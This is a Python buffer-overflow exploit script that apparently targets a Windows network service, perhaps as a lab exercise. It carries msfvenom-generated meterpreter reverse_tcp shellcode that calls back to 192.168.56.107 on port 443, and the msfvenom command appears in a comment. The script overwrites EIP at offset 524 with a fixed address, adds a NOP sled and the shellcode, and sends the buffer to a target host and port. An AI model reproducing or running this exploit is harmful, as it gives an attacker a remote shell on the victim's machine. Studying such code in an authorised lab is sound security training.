#!/usr/bin/python3

import socket
import sys
from struct import pack



if len(sys.argv) !=3:
	print("Usage: {} 192.168.0.1 80")
	exit(-1)
else:

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.107 LPORT=443 -b"\x00\x0a\x0d\x09\x20" -f py -v shellcode
#Payload size: 381 bytes
#Final size of py file: 2136 bytes
# badchar are "\x00\x0a\x0d"	some case \x09\x20 also badchar so i simply ignore that bytes

	try:
		shellcode =  b""
		shellcode += b"\xbd\xd3\x02\xd7\x57\xd9\xf6\xd9\x74\x24\xf4"
		shellcode += b"\x5a\x29\xc9\xb1\x59\x83\xc2\x04\x31\x6a\x10"
		shellcode += b"\x03\x6a\x10\x31\xf7\x2b\xbf\x3a\xf8\xd3\x40"
		shellcode += b"\x24\xc8\x01\xc9\x41\x4e\x2d\x98\xb9\x04\x63"
		shellcode += b"\x11\x32\x48\x90\x18\xbb\x62\x2f\x10\x65\xf6"
		shellcode += b"\x3d\x8d\x58\xc8\x6e\xf1\xfb\xb4\x6c\x26\xdb"
		shellcode += b"\x85\xbe\x3b\x1a\xc1\x08\x31\xf3\x9f\xdd\x32"
		shellcode += b"\x59\x30\x69\x06\x61\x31\xbd\x0c\xd9\x49\xb8"
		shellcode += b"\xd3\xad\xe5\xc3\x03\xc6\xae\xe3\x28\x90\x56"
		shellcode += b"\xe5\xfd\x70\xe2\x2c\x75\x4c\xdd\x51\x3f\x27"
		shellcode += b"\x29\x25\xc1\xe1\x63\xf9\x03\xc2\x89\x55\x82"
		shellcode += b"\x1b\xa9\x45\xf0\x57\xc9\xf8\x03\xac\xb3\x26"
		shellcode += b"\x81\x32\x13\xac\x31\x96\xa5\x61\xa7\x5d\xa9"
		shellcode += b"\xce\xa3\x39\xae\xd1\x60\x32\xca\x5a\x87\x94"
		shellcode += b"\x5a\x18\xac\x30\x06\xfa\xcd\x61\xe2\xad\xf2"
		shellcode += b"\x71\x4a\x11\x57\xfa\x79\x44\xe7\x03\x82\x69"
		shellcode += b"\xb5\x93\x4e\xa4\x46\x63\xd9\xbf\x35\x51\x46"
		shellcode += b"\x14\xd2\xd9\x0f\xb2\x25\x68\x07\x45\xf9\xd2"
		shellcode += b"\x48\xbb\xfa\x22\x40\x78\xae\x72\xfa\xa9\xcf"
		shellcode += b"\x19\xfa\x56\x1a\xb7\xf0\xc0\x65\xef\x3d\x7a"
		shellcode += b"\x0e\xed\x3d\x7d\x75\x78\xdb\x2d\xd9\x2a\x74"
		shellcode += b"\x8e\x89\x8a\x24\x66\xc0\x05\x1a\x96\xeb\xcc"
		shellcode += b"\x33\x3d\x04\xb8\x6c\xaa\xbd\xe1\xe7\x4b\x41"
		shellcode += b"\x3c\x82\x4c\xc9\xb4\x72\x02\x3a\xbd\x60\x73"
		shellcode += b"\x5d\x3d\x79\x84\xc8\x3d\x13\x80\x5a\x6a\x8b"
		shellcode += b"\x8a\xbb\x5c\x14\x74\xee\xdf\x53\x8a\x6f\xe9"
		shellcode += b"\x28\xbd\xe5\x55\x47\xc2\xe9\x55\x97\x94\x63"
		shellcode += b"\x55\xff\x40\xd0\x06\x1a\x8f\xcd\x3b\xb7\x1a"
		shellcode += b"\xee\x6d\x6b\x8c\x86\x93\x52\xfa\x08\x6c\xb1"
		shellcode += b"\x78\x4e\x92\x47\x57\xf7\xfa\xb7\xe7\x07\xfa"
		shellcode += b"\xdd\xe7\x57\x92\x2a\xc7\x58\x52\xd2\xc2\x30"
		shellcode += b"\xfa\x59\x83\xf3\x9b\x5e\x8e\x52\x05\x5e\x3d"
		shellcode += b"\x4f\xb6\x25\x4e\x70\x37\xda\x46\x15\x38\xda"
		shellcode += b"\x66\x2b\x05\x0c\x5f\x59\x48\x8c\xe4\x52\xff"
		shellcode += b"\xb1\x4d\xf9\xff\xe6\x8e\x28"
		
		#[*] Exact match at offset 524
		buffer = b"\x41"*524				#padding 
		buffer += pack("<L",0x311712f3)			#eip 31 17 12 f3
		buffer += b"\x90"*24				#nop sled
		buffer += shellcode				#meterpreter shellcode 
		buffer += b"\x41"*(5000 - len(buffer))		#adjust payload
		
		payload = buffer				#pointing to crafted buffer
		
		target = (sys.argv[1],int(sys.argv[2]))			
		with socket.create_connection(target) as sock:
			sock.recv(512)
			sent = sock.send(payload)
			print(f"[+]sended {sent} bytes")
		print("[+]Good Bye")
	except:
		print("oops something went weong")
